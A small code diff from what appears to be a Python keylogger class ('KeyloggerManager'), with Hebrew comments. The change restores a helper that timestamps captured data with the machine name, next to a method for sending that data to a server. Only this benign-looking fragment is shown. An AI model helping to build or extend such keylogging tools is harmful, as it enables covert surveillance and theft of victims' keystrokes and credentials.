@@ -94,10 +94,10 @@ class KeyloggerManager:
         except Exception as e:
             print(f"Error processing buffer: {e}")
 
-# # פונקציה שמוסיפה זמן
-#     def _add_timestamp(self, data: str) -> str:
-#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-#         return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
+# פונקציה שמוסיפה זמן
+    def _add_timestamp(self, data: str) -> str:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
 
 # פונקציה ששולחת לצד שרת
     def _send_to_writers(self, data: str) -> None:
